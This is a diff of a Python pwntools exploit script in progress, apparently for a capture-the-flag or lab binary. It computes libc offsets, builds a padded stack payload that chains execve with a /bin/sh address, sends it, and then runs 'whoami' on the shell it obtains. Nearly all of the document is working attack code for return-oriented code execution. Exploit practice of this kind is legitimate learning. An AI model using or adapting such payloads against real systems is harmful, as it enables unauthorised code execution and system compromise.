@@ -28,10 +28,7 @@ rop_addr = rop.ebx.address
 #0x000183a5
 target = libc_base + 0x001134d9 # add to esp
 my_rop = p32(target)
-#my_rop = p32(rop.ebx.address)
-#my_rop = bytes(rop)
 print(f"ROP: {my_rop}")
-# 0x00111ef1 : setne al ; add esp, 0x74 ; pop ebx ; pop edi ; ret
 
 print(f"ROP offset: {hex(rop.ebx.address)}")
 #print(f"DUMP: {my_rop.dump()}")
@@ -48,14 +45,21 @@ with open("payload", "w") as f:
 #payload = ",.,.<\nAB\n".encode() # --> should work
 # 1st part - before the input - just the commands
 system_addr = libc.symbols["system"]
+execve_addr = libc.symbols["execve"]
 print(f"system_addr: {str(system_addr)}")
+print(f"execve: {p32(execve_addr)}")
 padding = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa"  
 # fill stack with arbitrary values so I can increase esp and prepare stack for
 #payload = padding +sh_addr + system_addr
 sh_addr = system_addr + 0x120d7b
 
-arbitrary_bash_addr = 0xffffcc04
-payload = padding  + p32(0xdeadbeef) +  p32(system_addr)+p32(arbitrary_bash_addr)+p32(arbitrary_bash_addr) +b"/bin/dash"
+exit_addr = libc.symbols["exit"]
+return_addr = 0x08048830 # return from program - we call it since if we call
+return_addr = libc_base + 0x00003980 # return from program - we call it since if we call
+#exit() then our execve() fork process will die
+arbitrary_bash_addr = 0xffffcc0c
+new_esp_val = 0x12345678
+payload=padding+p32(0xdeadbeef)+p32(execve_addr)+p32(return_addr)+p32(sh_addr)+p32(0xffff2222)+p32(0xffff1234)+p32(sh_addr)+ p32(new_esp_val)
 print(f"sh_addr: {str(sh_addr)}")
 payload += b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 #payload += "<" * 128 #move back 136 bytes -,.\nAB\n".encode() # --> should work
@@ -95,6 +99,11 @@ print(conn.recvline()) # receive until newline
 #print(conn.recvline()) # receive until newline
 output = conn.recv()
 print(f"Program output: {output}") # receive until newline
+conn.send("whoami\n")
+output = conn.recvline()
+#output += conn.recvline()
+#output += conn.recvline()
+print(f"Program output: {output.decode()}") # receive until newline
 #conn.recvuntil(b"result:") # receive until given keyword
 #conn.send(b"-,+" + "\n" + "AB")
 
